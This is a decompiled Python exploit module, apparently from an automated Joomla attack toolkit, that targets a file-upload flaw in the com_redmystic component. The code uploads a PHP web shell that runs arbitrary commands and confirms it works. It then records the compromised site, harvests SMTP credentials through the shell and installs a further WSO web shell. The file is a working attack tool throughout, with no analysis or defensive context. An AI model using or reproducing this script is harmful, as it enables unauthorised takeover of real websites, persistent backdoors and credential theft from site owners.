# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Com_redmystic.py
import requests
from Exploits import printModule
from Tools import getSMTP
from Tools import wsoShellUploaderModule
payloadshell = '"Vuln!!<?php {});?>"'.format('system({}'.format('$_GET["cmd"]'))
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
   }

def Exploit(site):
    try:
        requests.post('http://' + site + '/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=vuln.php', data=payloadshell, headers=Headers, timeout=10)
        Exp = requests.get('http://' + site + '/administrator/components/com_redmystic/chart/tmp-upload-images/vuln.php', headers=Headers, timeout=10)
        if 'Vuln!!' in str(Exp.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write(site + '/administrator/components/com_redmystic/chart/tmp-upload-images/vuln.php?cmd=uname -a' + '\n')
            getSMTP.JooomlaSMTPshell(site + '/administrator/components/com_redmystic/chart/tmp-upload-images/vuln.php?cmd=id')
            WSo = wsoShellUploaderModule.UploadWso(site + '/administrator/components/com_redmystic/chart/tmp-upload-images/vuln.php?cmd=id')
            if WSo == 'No':
                pass
            else:
                with open('result/WSo_Shell.txt', 'a') as Wr:
                    Wr.write('{}\n'.format(WSo))
            return printModule.returnYes(site, 'N/A', 'Com_redmystic', 'Joomla')
        return printModule.returnNo(site, 'N/A', 'Com_redmystic', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_redmystic', 'Joomla')